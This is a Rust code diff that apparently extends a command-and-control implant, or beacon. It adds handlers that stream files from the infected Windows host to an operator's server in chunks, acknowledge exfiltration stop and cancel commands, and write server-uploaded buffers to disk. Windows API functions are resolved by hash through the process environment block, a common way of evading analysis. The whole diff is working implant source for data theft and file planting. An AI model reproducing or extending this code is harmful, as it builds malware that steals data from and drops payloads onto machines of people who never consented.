@@ -48,6 +48,7 @@ const H_TERMINATE_PROCESS: u64 = fnv1a64(b"TerminateProcess");
 const H_OPEN_PROCESS_TOKEN: u64 = fnv1a64(b"OpenProcessToken");
 const H_GET_TOKEN_INFORMATION: u64 = fnv1a64(b"GetTokenInformation");
 const H_ADVAPI32: u64 = specter_core::fnv::fnv1a64_wide_ascii_ci("advapi32.dll");
+const H_WRITE_FILE: u64 = fnv1a64(b"WriteFile");
 
 /// WIN32_FIND_DATAA tail: attributes at +0, ftLastWriteTime at +0x14,
 /// size (high:low) at +0x1C/+0x20, cFileName at +0x2C.
@@ -96,6 +97,9 @@ pub unsafe fn handle(instance: &mut Instance, task: Task, id: u32, results: &mut
         Task::Disks => disks(kernel32, id, results),
         Task::PsList => ps_list(kernel32, id, results),
         Task::PsKill { pid } => ps_kill(kernel32, pid, id, results),
+        Task::Download { .. } => download_start(instance, &task, id, results),
+        Task::Upload { .. } => upload_write(instance, &task, id, results),
+        Task::Exfil { action, file_id } => exfil(instance, action, file_id, id, results),
         Task::Sleep { .. } | Task::Terminate => {}
     }
 }
@@ -723,6 +727,321 @@ unsafe fn ps_kill(kernel32: *mut c_void, pid: u32, id: u32, results: &mut Writer
         return;
     }
     let _ = transport::push_ps_kill_result(results, id, pid);
+}
+
+/// One active download: the handle stays open across cycles, one chunk
+/// per POST (64 KiB — the cycle body budget, docs/WIRE.md).
+pub struct DownloadState {
+    pub task_id: u32,
+    pub file_id: u32,
+    pub handle: isize,
+    pub size: u64,
+    pub name: [u8; 64],
+    pub name_len: u16,
+    pub started: bool,
+}
+
+/// One active upload: chunks accumulate in a heap buffer until the
+/// UPLOAD command names the destination.
+pub struct UploadState {
+    pub memory_id: u32,
+    pub expected: usize,
+    pub buf: *mut u8,
+    pub cap: usize,
+    pub received: usize,
+}
+
+/// Upload size cap: the heap buffer is allocated for the announced
+/// size; anything beyond is refused (the upload task then errors).
+const UPLOAD_MAX: usize = 8 * 1024 * 1024;
+
+/// The download chunk pushed per cycle.
+const DOWNLOAD_CHUNK: usize = 64 * 1024;
+
+unsafe fn download_start(instance: &mut Instance, task: &Task, id: u32, results: &mut Writer) {
+    let kernel32 = instance.kernel32;
+    let create = peb::find_export(kernel32, H_CREATE_FILE_A);
+    let close = peb::find_export(kernel32, H_CLOSE_HANDLE);
+    if create.is_null() || close.is_null() {
+        return;
+    }
+    let create = *(create
+        as *const unsafe extern "system" fn(
+            *const u8,
+            u32,
+            u32,
+            *const c_void,
+            u32,
+            u32,
+            *const c_void,
+        ) -> isize);
+    // An open download closes first (one at a time).
+    if let Some(dl) = instance.download.take() {
+        (*(close as *const unsafe extern "system" fn(isize) -> i32))(dl.handle);
+    }
+    let mut path = [0u8; 260];
+    if c_path(task, &mut path).is_none() {
+        error(kernel32, id, results);
+        return;
+    }
+    let handle = create(
+        path.as_ptr(),
+        0x8000_0000,               // GENERIC_READ
+        0x0000_0001 | 0x0000_0002, // FILE_SHARE_READ | FILE_SHARE_WRITE
+        core::ptr::null(),
+        3, // OPEN_EXISTING
+        0,
+        core::ptr::null(),
+    );
+    if handle == -1 {
+        error(kernel32, id, results);
+        return;
+    }
+    // Size via the file pointer end (SetFilePointer(-1...) = EOF).
+    let tell = peb::find_export(kernel32, fnv1a64(b"SetFilePointer"));
+    let mut size = 0u64;
+    if !tell.is_null() {
+        let tell = *(tell as *const unsafe extern "system" fn(isize, i32, *mut i32, u32) -> u32);
+        let mut high: i32 = 0;
+        let _ = tell(handle, 0, &mut high, 2); // FILE_END
+        size = ((high as i64 as u64) << 32).wrapping_add(0);
+        let _ = tell(handle, 0, core::ptr::null_mut(), 0); // rewind (FILE_BEGIN)
+    }
+    // Name: the task path (bounded copy for the START record).
+    let path = task.path();
+    let mut name = [0u8; 64];
+    let nlen = path.len().min(64);
+    let mut i = 0;
+    while i < nlen {
+        name[i] = path[i];
+        i += 1;
+    }
+    instance.download = Some(DownloadState {
+        task_id: id,
+        file_id: instance.rng.next_u64() as u32,
+        handle,
+        size,
+        name,
+        name_len: nlen as u16,
+        started: false,
+    });
+}
+
+/// Stream one download chunk (or the START/FINISH records) into the
+/// cycle body. Called at POST time, before the results frame is closed.
+///
+/// # Safety
+///
+/// Beacon thread; instance stored in the TEB.
+pub unsafe fn download_tick(instance: &mut Instance, w: &mut Writer, chunk: &mut [u8]) {
+    let kernel32 = instance.kernel32;
+    let Some(dl) = instance.download.as_mut() else {
+        return;
+    };
+    if !dl.started {
+        let name = &dl.name[..dl.name_len as usize];
+        if !transport::push_download_start(w, dl.task_id, dl.file_id, dl.size, name) {
+            return;
+        }
+        dl.started = true;
+    }
+    let read_ptr = peb::find_export(kernel32, H_READ_FILE);
+    let close = peb::find_export(kernel32, H_CLOSE_HANDLE);
+    if read_ptr.is_null() || close.is_null() {
+        return;
+    }
+    let read = *(read_ptr
+        as *const unsafe extern "system" fn(isize, *mut u8, u32, *mut u32, *const c_void) -> i32);
+    let close = *(close as *const unsafe extern "system" fn(isize) -> i32);
+    let want = chunk.len().min(DOWNLOAD_CHUNK);
+    let mut got: u32 = 0;
+    let handle = dl.handle;
+    if read(
+        handle,
+        chunk.as_mut_ptr(),
+        want as u32,
+        &mut got,
+        core::ptr::null(),
+    ) == 0
+    {
+        // Read failure: close and report — the server marks the task
+        // running; the FINISH never comes (the operator cancels).
+        close(handle);
+        instance.download = None;
+        return;
+    }
+    if got == 0 {
+        // EOF: FINISH and done.
+        let _ = transport::push_download_finish(w, dl.task_id, dl.file_id);
+        close(handle);
+        instance.download = None;
+        return;
+    }
+    let _ = transport::push_download_continue(w, dl.task_id, dl.file_id, &chunk[..got as usize]);
+}
+
+unsafe fn exfil(instance: &mut Instance, action: u8, file_id: u32, id: u32, results: &mut Writer) {
+    let kernel32 = instance.kernel32;
+    let close = peb::find_export(kernel32, H_CLOSE_HANDLE);
+    if action == transport::EXFIL_STOPPED || action == transport::EXFIL_CANCELED {
+        let matches = match instance.download.as_ref() {
+            Some(dl) => dl.file_id == file_id,
+            None => false,
+        };
+        if matches {
+            if let Some(dl) = instance.download.take() {
+                if !close.is_null() {
+                    (*(close as *const unsafe extern "system" fn(isize) -> i32))(dl.handle);
+                }
+            }
+        }
+    }
+    // Always ack with the requested state — the server renders the
+    // stop/resume/cancel message. RESUME is a no-op: the beacon streams
+    // continuously and never pauses on its own.
+    let _ = transport::push_exfil_result(results, id, file_id, action);
+}
+
+/// Accumulate a SAVEMEMORY chunk into the upload buffer (heap). No ack:
+/// the server has no ProcessData case for it.
+///
+/// # Safety
+///
+/// Beacon thread; heap resolved on the instance.
+pub unsafe fn save_memory(instance: &mut Instance, memory_id: u32, expected: usize, chunk: &[u8]) {
+    let Some(heap) = instance.heap else {
+        return;
+    };
+    if expected > UPLOAD_MAX {
+        return;
+    }
+    match instance.upload.as_mut() {
+        None => {
+            let buf = (heap.alloc)(heap.handle, 0x08, expected); // HEAP_ZERO_MEMORY
+            if buf.is_null() {
+                return;
+            }
+            instance.upload = Some(UploadState {
+                memory_id,
+                expected,
+                buf: buf as *mut u8,
+                cap: expected,
+                received: 0,
+            });
+        }
+        Some(up) => {
+            if up.memory_id != memory_id || up.expected != expected {
+                // A different upload replaces the previous one.
+                (heap.free)(heap.handle, 0, up.buf as *mut c_void);
+                let buf = (heap.alloc)(heap.handle, 0x08, expected);
+                if buf.is_null() {
+                    instance.upload = None;
+                    return;
+                }
+                up.memory_id = memory_id;
+                up.expected = expected;
+                up.buf = buf as *mut u8;
+                up.cap = expected;
+                up.received = 0;
+            }
+        }
+    }
+    let Some(up) = instance.upload.as_mut() else {
+        return;
+    };
+    if up.received + chunk.len() > up.cap {
+        return; // overflow of the announced size: drop (never happens
+                // with a conforming server)
+    }
+    let mut i = 0;
+    while i < chunk.len() {
+        *up.buf.add(up.received + i) = chunk[i];
+        i += 1;
+    }
+    up.received += chunk.len();
+}
+
+unsafe fn upload_write(instance: &mut Instance, task: &Task, id: u32, results: &mut Writer) {
+    let kernel32 = instance.kernel32;
+    let memory_id = match task {
+        Task::Upload { memory_id, .. } => *memory_id,
+        _ => return,
+    };
+    let up = instance.upload.take();
+    let Some(up) = up else {
+        error(kernel32, id, results);
+        return;
+    };
+    if up.memory_id != memory_id {
+        error(kernel32, id, results);
+    } else {
+        let create = peb::find_export(kernel32, H_CREATE_FILE_A);
+        let write = peb::find_export(kernel32, H_WRITE_FILE);
+        let close = peb::find_export(kernel32, H_CLOSE_HANDLE);
+        if create.is_null() || write.is_null() || close.is_null() {
+            error(kernel32, id, results);
+        } else {
+            let create = *(create
+                as *const unsafe extern "system" fn(
+                    *const u8,
+                    u32,
+                    u32,
+                    *const c_void,
+                    u32,
+                    u32,
+                    *const c_void,
+                ) -> isize);
+            let write = *(write
+                as *const unsafe extern "system" fn(
+                    isize,
+                    *const u8,
+                    u32,
+                    *mut u32,
+                    *const c_void,
+                ) -> i32);
+            let close = *(close as *const unsafe extern "system" fn(isize) -> i32);
+            let mut path = [0u8; 260];
+            if c_path(task, &mut path).is_none() {
+                error(kernel32, id, results);
+            } else {
+                let handle = create(
+                    path.as_ptr(),
+                    0x4000_0000, // GENERIC_WRITE
+                    0,
+                    core::ptr::null(),
+                    2, // CREATE_ALWAYS
+                    0,
+                    core::ptr::null(),
+                );
+                if handle == -1 {
+                    error(kernel32, id, results);
+                } else {
+                    let mut written: u32 = 0;
+                    let mut ok = write(
+                        handle,
+                        up.buf as *const u8,
+                        up.received as u32,
+                        &mut written,
+                        core::ptr::null(),
+                    );
+                    // Chunks beyond 4 GB would wrap u32 — the cap makes
+                    // this unreachable; kept for honesty.
+                    if ok != 0 && (written as usize) < up.received {
+                        ok = 0;
+                    }
+                    close(handle);
+                    if ok == 0 {
+                        error(kernel32, id, results);
+                    } else {
+                        let _ = transport::push_upload_result(results, id);
+                    }
+                }
+            }
+        }
+    }
+    if let Some(heap) = instance.heap {
+        (heap.free)(heap.handle, 0, up.buf as *mut c_void);
+    }
 }
 
 unsafe fn error(kernel32: *mut c_void, id: u32, results: &mut Writer) {
